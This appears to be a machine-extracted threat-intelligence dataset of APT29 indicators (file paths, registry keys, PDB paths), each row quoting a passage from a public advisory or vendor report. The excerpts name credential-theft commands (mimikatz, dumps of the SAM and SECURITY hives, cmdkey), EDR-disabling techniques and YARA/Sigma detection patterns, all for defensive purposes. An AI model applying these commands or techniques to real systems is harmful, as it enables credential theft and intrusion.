1.0.0,actor--apt29,artifact--sha256:2ed4188622cad8bc76747c847ec60dacda553ec32ef3aa3512cd587ec0f2aabf,observation--sha256:5d47a736a7c06fe4771d68f048e39eec501632ec5eb3ab6d12eca67eccdb4b2d,file-path,C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q,C:\Windows\temp\s.zip -Force & del C:\Windows\temp\1 /F /Q,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:201fafc4ae8ae1c45290647c510283f17f113589f460c1267fc05ba0a8cfc8c0,observation--sha256:d8a7400581c1d51bfe427971fc040d96d1584c169d4a7ccf029233755448ffad,file-path,C:\\Server\\Mail\\App_Data\\Temp\\agent.sh\\src,C:\\Server\\Mail\\App_Data\\Temp\\agent.sh\\src,candidate,,unknown,unknown,not-stated,2020-07-09T00:00:00Z,source--apt29--79b26424fe6b8024,APT29/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Yara Rules rule wellmail_unique_strings { meta: description = ""Rule for detection of WellMail based on unique strings contained in the binary"" author = ""NCSC"" hash = ""0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494"" strings: $a = ""C:\\Server\\Mail\\App_Data\\Temp\\agent.sh\\src"" $b = ""C:/Server/Mail/App_Data/Temp/agent.sh/src/main.go"" $c = ""HgQdbx4qRNv"" $d = ""042a51567eea19d5aca71050b4535d33d2ed43ba"" $e = ""main.zipit"" $f = ""@[^\\s]+?\\s(?P<tar>.*?)\\s"" condition: uint32(0) == 0x",
1.0.0,actor--apt29,artifact--sha256:c99052d02ace2ea034ec404616d0ebb48cc73a528d5ae56a51a81413033177af,observation--sha256:cd2d56546c27fb460a33bd9320c0e03ec6583ceffe57d3d0babb6174a31cf38a,file-path,C:\\programdata\\srv.txt,C:\\programdata\\srv.txt,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 24}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group 3.3.2 Sarasota Script The PTI Team was also able to discover another novel enumeration script used frequently by the SilverFish group. The initiating function of the script is named Sarasota and was most probably written by the SilverFish group. The encoded form of Sarasota script in the following image was executed on more than 200 victims’ machines. Figure 24. Sarasota script execution task on C&C The decoded contents of the Sarasota script contains functions for,
1.0.0,actor--apt29,artifact--sha256:19cb204cd08c703635b13b8c2cf80f5e372a480aca636dd7ac9cb0121c0f980e,observation--sha256:1a786191139e0f1a14475e6a11d43c67a3e179f27221d16ec2ee56b4fecdb94c,file-path,E:\Visual Studio 2010\Projects\Agent_NextGen\Agent2011v3\Agent2011\Agent\,E:\Visual Studio 2010\Projects\Agent_NextGen\Agent2011v3\Agent2011\Agent\,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 28 CozyDuke is not simply a malware toolset; rather, it is a modular malware platform formed around a core backdoor component. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. Known CozyDuke modules include: • Command execution module for executing arbitrary Windows Command Prompt commands • Password stealer module • NT LAN Manager (",
1.0.0,actor--apt29,artifact--sha256:08cb563ea7a6e98c2513a7f88d29fc0401a72f7fe13a2352e0aabe65fd2f1881,observation--sha256:410a92d31696b683aedfc72aec7283d87a99dfe0f6ce8b57b0b185a32045095d,file-path,c:\\programdata Prints the contents of ”programdata” directory,c:\\programdata Prints the contents of ”programdata” directory,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 21}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group Occurance Command Explanation 2880 nltest /dclist : Lists all domain controllers in the domain. 2283 nltest /domain_trusts Returns a list of trusted domains. 1547 cmdkey /list Displays the list of stored user names and credentials. 670 net group ”domain admins” /domain Lists domain admin users. 537 dir c:\\programdata Prints the contents of ”programdata” directory (used for enumerating the installed software) 206 powershell -nop -enc %Trimmed...% Executes the BASE6,
1.0.0,actor--apt29,artifact--sha256:7367bb0af0f9a43df3e2cbe0bf3feadcea0955d8e49d8f9c7bcd3661c403a7d1,observation--sha256:bad123c13a3f58524bfaa40710056548855ac643403af898d8cf04fe75abf904,pdb-path,D:\Projects\Agent2011\Agent2011\Agent\tasks\bin\systeminfo\exe\systeminfo.pdb,D:\Projects\Agent2011\Agent2011\Agent\tasks\bin\systeminfo\exe\systeminfo.pdb,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 28 CozyDuke is not simply a malware toolset; rather, it is a modular malware platform formed around a core backdoor component. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. Known CozyDuke modules include: • Command execution module for executing arbitrary Windows Command Prompt commands • Password stealer module • NT LAN Manager (",
1.0.0,actor--apt29,artifact--sha256:2507e6f223fe33c26eaf6c1aa61b5d9d8776854af946821b304f5d7b666521a1,observation--sha256:7a55e6c32cd1498ab97909268c6b37da692f6cbc29aeb48349e527146f6c12f9,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runregistry for,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Runregistry for,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:2196a7a0fb28d48bbab6ea3c697da245d8eccb5bb1236bc6695785d860516f34,observation--sha256:9611c83f1ec0ccbd1c0e8ecc832805d622876998b6c3b565ffae26b75f64471c,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:22b002585ac4e60a2aadad0d18165ca6eb87df7a4dbdb7ca647fe7aac01d0874,observation--sha256:8e707e5179b5087f71f0fb17931bcc89737b70576449b4bbfd627e1fa3062003,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLmHash /t,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v NoLmHash /t,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 5 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  SVR cyber actors also exfiltrated secforwarder.dll Tactics Used to Avoid Detection To avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software. [T1562.001] This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remo",
1.0.0,actor--apt29,artifact--sha256:edd27f0e0a8f081ee330eaf379c8af597d158038e32693c6eea73b160c587b4f,observation--sha256:8e789c543421a905e4d795c45a193d9d42a3106278b0eb91af39f474a202bd16,registry-key,HKLM\SAM,HKLM\SAM,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 12 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR exfiltrated Windows registry hives to steal credentials. • HKLM\SYSTEM • HKLM\SAM • HKLM\SECURITY Credentials from Password Stores: Credentials from Web Browsers T1555.003 In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins. Steal or Forge Kerberos Tickets: Golden Ticket T1558.001 To secure long-term access to the",
1.0.0,actor--apt29,artifact--sha256:edd27f0e0a8f081ee330eaf379c8af597d158038e32693c6eea73b160c587b4f,observation--sha256:3ce00d6af4c6b85022d84471bfe5bcb40a84c02fa5b8bcdad47cea02d7d2ae1c,registry-key,HKLM\SAM,HKLM\SAM,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:174e6fd2069378aa882d2f4aac6ab1ce5edb654cf9f2b32c505a6e152924e949,observation--sha256:6199d5e2a9f518b2090839fb97e9487fac0c9019e1991e8d8aa958beab1d0f2a,registry-key,HKLM\SECURITY,HKLM\SECURITY,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 12 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR exfiltrated Windows registry hives to steal credentials. • HKLM\SYSTEM • HKLM\SAM • HKLM\SECURITY Credentials from Password Stores: Credentials from Web Browsers T1555.003 In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins. Steal or Forge Kerberos Tickets: Golden Ticket T1558.001 To secure long-term access to the",
1.0.0,actor--apt29,artifact--sha256:174e6fd2069378aa882d2f4aac6ab1ce5edb654cf9f2b32c505a6e152924e949,observation--sha256:88bc6cae4c9d62e369c607f855b62ee58d38a05ea249ed5fa695408886ccb8a3,registry-key,HKLM\SECURITY,HKLM\SECURITY,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:fa52e8c5629d0f7a337643f80512170b71a45200aecf9de864d92b40d162f0c7,observation--sha256:ac2a8979a6c7278674aedc60967fb0775e64f7f2ca239fae76269e5404a28843,registry-key,HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the,HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:dc72f4bfae5c1dd6eb3cb1b29cc5b498871a753c9ee4a3c68de536dbf373bba5,observation--sha256:8bb25d06a2a4a8dd7b000e781feb4e4550b85962cd836e6c216a48065cad29af,registry-key,HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid . This,HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid . This,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"44Easter Bunny 3.2.2.2 Obtain decryption key (CREATE_XOR_KEY) After initializing all the APIs that the first block of code will need, enter the CREATE_XOR_KEY function, which will retrieve the key used to encrypt the second block of embedded code. The XOR key will be generated from the following values specific to the infected system, concatenating their values: BIOS IDENTIFIER The GET_OSVERSION function, which uses the GetVersion() API and the GET_FIRMWARE_TABLE function, provides all the opera",
1.0.0,actor--apt29,artifact--sha256:f20f548157d2e7d7dcb21930ed0852997491b0200bb7685d8f4ce7c0ba468fc9,observation--sha256:7d29a6c259c207a7a4e9defc989d08df5c7c4c7af58ccc4bdbccc6e1e8f53fd5,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 81}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"80Easter Bunny Illustration 73. Operating system version The operating system version and architecture can be obtained by accessing the registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ ReleaseId It then identifies the alphabet used thanks to the ANSI Code Page (ACP) and the Original Equipment Manufacturer Code Page (OEMCP), using the GetACP and GetOEMCP APIs respectively. Illustration 74. ACP and OEMCP identifiers",
1.0.0,actor--apt29,artifact--sha256:6a3e2554fe13b5196349ed0f8cf8afcb9f25cf9c68116c86b1c97ad6881554fa,observation--sha256:ba16a10fcef6242ddae6c8bc42733b0ef178f66055332ac45f9ab4ad354551f2,registry-key,HKLM\SYSTEM,HKLM\SYSTEM,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 12 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR exfiltrated Windows registry hives to steal credentials. • HKLM\SYSTEM • HKLM\SAM • HKLM\SECURITY Credentials from Password Stores: Credentials from Web Browsers T1555.003 In a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such as session cookies, browsing history, or saved logins. Steal or Forge Kerberos Tickets: Golden Ticket T1558.001 To secure long-term access to the",
1.0.0,actor--apt29,artifact--sha256:6a3e2554fe13b5196349ed0f8cf8afcb9f25cf9c68116c86b1c97ad6881554fa,observation--sha256:c6728fce855764202e3101af84f8fb159246715378f5d771da5ced73fb7d508b,registry-key,HKLM\SYSTEM,HKLM\SYSTEM,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:f7ef59c5c4e0d0099ed3ca291139cf8b56341b655c9046e5ed6a6c7ac436d90c,observation--sha256:c8d299ce8ff048f23df7b6a9fce5680679bfd7fe3abf611a3238edc8a18fd4cf,registry-key,HKLM\Software\,HKLM\Software\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:0f10b512219e2486d92ce815e3da277da5c23a359a92db748140189dc46f5912,observation--sha256:d51eacc7854e183cdbe97096c261d41c0e897686332b61e839f121b5f39800c3,registry-key,HKLM\Software\Microsoft\,HKLM\Software\Microsoft\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:ae498a6cd3d4cd9fdae39bf313acadeb779d5650e9f8b48fe09b5696b3299555,observation--sha256:a6b1806bab210144406a75564053ea71732bf5e61fac413bdcb8d7223ae9369e,registry-key,HKLM\\SYSTEM.*|.*HKLM\\SECURITY.*|.*HKLM\\SAM.*,HKLM\\SYSTEM.*|.*HKLM\\SECURITY.*|.*HKLM\\SAM.*,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 17 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR references: author: date: 2023/11/15 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - 'AclNumsInvertHost.dll' - 'ModeBitmapNumericAnimate.dll' - 'UnregisterAncestorAppendAuto.dll' - 'DeregisterSeekUsers.dll' - 'ScrollbarHandleGet.dll' - 'PerformanceCaptionApi.dll' - 'WowIcmpRemoveReg.dll' - 'BlendMonitorStringBuild.dll' - 'HandleFrequencyAll.dll' - 'HardSwapColor.dll',
1.0.0,actor--apt29,artifact--sha256:0654ce96c1849eadcbc099756ac6dd476bac064926be44bb4e2b01d11a273d71,observation--sha256:e60cba2c4ca4038e291236d92d6e9faa4cbe8a353ee3ce85bcd729e0c1dcc810,registry-key,HKU\<SID> \SOFTWARE\Classes\CLSID\{5209a075-42bc-371f-780d-,HKU\<SID> \SOFTWARE\Classes\CLSID\{5209a075-42bc-371f-780d-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:1ebfaa133aee63a5a205bb8059da2d7abcda871a4e9f4ba1937c08cc1c6b5df1,observation--sha256:72cb858c78d5c69a4b18346ce485c82b030a4fdeecbd467fedba1aab70a2ffc5,registry-key,HKU\<SID> \SOFTWARE\Classes\CLSID\{c87d7a0e-5d14-1d0d-3352-,HKU\<SID> \SOFTWARE\Classes\CLSID\{c87d7a0e-5d14-1d0d-3352-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:77b6133ff0d7e6c61a50d172f20d85d9987a783a86bf48d5c6a299e53527cda6,observation--sha256:8e2755a91da09ef885929a155389050372c191c16946c9277b23c2cb344f335f,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{047f86db-c962-c9af-936f-,HKU\<SID>\SOFTWARE\Classes\CLSID\{047f86db-c962-c9af-936f-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:22632c9b34d6311d62fb678f8a1b3495673fefa7fb891b4bf89151c9176576f3,observation--sha256:44d10f7d63292d624687ab077387c028a014db109cd7ed9b47dbf06de9f92c79,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{43543050-c253-c0c1-7606-,HKU\<SID>\SOFTWARE\Classes\CLSID\{43543050-c253-c0c1-7606-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:57ab39b2dd2c1735b046277d4fb87095f0e440015b09a4f09bcef2c3e0dd8a74,observation--sha256:f54aab8f11cf08b7c925b869398c93c65177c94cbe452eac518c5aec8732f6f8,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{44d271e8-b94c-7f29-4af1-,HKU\<SID>\SOFTWARE\Classes\CLSID\{44d271e8-b94c-7f29-4af1-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:5605393b782e00f43a4250f1de351490ffc956c00a96889f94028124a374fe0e,observation--sha256:e8f724b41755c9247fd8736aaca09bbe76a7b83adccc2af7b54b2569ad1015a6,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{9571619b-9e01-232b-9b24-,HKU\<SID>\SOFTWARE\Classes\CLSID\{9571619b-9e01-232b-9b24-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:7fc2f329cea1e6f055549d67f97da3ef15e2b5f0263ebd70590758a8b080debd,observation--sha256:41845fabde21d21ef10915c77a4d29bb179ed147194c1ec0c95b8bb5665532f5,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{9c26524d-acb6-641c-f838-,HKU\<SID>\SOFTWARE\Classes\CLSID\{9c26524d-acb6-641c-f838-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
1.0.0,actor--apt29,artifact--sha256:ec2990cfe8cd6e4abc4e9184ab0f9bde229d9e720bddbe1c89cc995d48b021d7,observation--sha256:5023062ef988aa83abe09c054acb915f7c4387252936ad7fd8cab9cfc7235de4,registry-key,HKU\<SID>\SOFTWARE\Classes\CLSID\{c1ecb4e0-0218-12a5-d95d-,HKU\<SID>\SOFTWARE\Classes\CLSID\{c1ecb4e0-0218-12a5-d95d-,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 76}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5275 Once the hash is obtained, the mutex will be formed by chaining specific positions of the hash, removing the last 8 bytes. Therefore, the mutex will be 16 bytes. [3][2][1][0] [7][6][5][4] [B][A][9][8] [F][E][D][C] Illustration 67 . Example of mutex The implants have the ability to maintain their configuration after reboots, saving a series of values in the registry that will be used later. The registry key that will be used corresponds to a COM object and is different for each ",
